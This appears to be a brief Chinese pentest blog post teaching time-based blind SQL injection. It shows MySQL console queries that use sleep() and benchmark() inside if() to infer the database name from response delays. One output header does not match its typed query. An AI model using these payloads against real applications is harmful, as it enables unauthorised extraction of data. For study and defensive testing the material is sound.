+++
title = "SQL注入之基于时间的注入"
topics = ["Pentest"]
tags = ["injection"]
description = "基于时间的SQL注入"
date = "2016-06-23T10:10:27+08:00"
draft = false
+++

### 0x00 基于时间的注入payload
```
mysql> select if((select database()) like "rte%",sleep(2),null);
+---------------------------------------------------+
| if((select database()) like "rte%",sleep(2),null) |
+---------------------------------------------------+
|                                                 0 |
+---------------------------------------------------+
1 row in set (2.00 sec)

mysql> select if((select database())="rteaaa",sleep(2),666);
+-----------------------------------------------+
| if((select database())="rtest1",sleep(2),666) |
+-----------------------------------------------+
|                                           666 |
+-----------------------------------------------+
1 row in set (0.00 sec)

mysql> select if((select database())="rtest",sleep(2),666);
+----------------------------------------------+
| if((select database())="rtest",sleep(2),666) |
+----------------------------------------------+
|                                            0 |
+----------------------------------------------+
1 row in set (2.00 sec)
```
```
mysql> select id,name,title from msg where id=if(1=1,benchmark(10000000,md5(11)),false);
Empty set (2.18 sec)

mysql> select id,name,title from msg where id=if(1=2,benchmark(10000000,md5(11)),false);
Empty set (0.00 sec)
```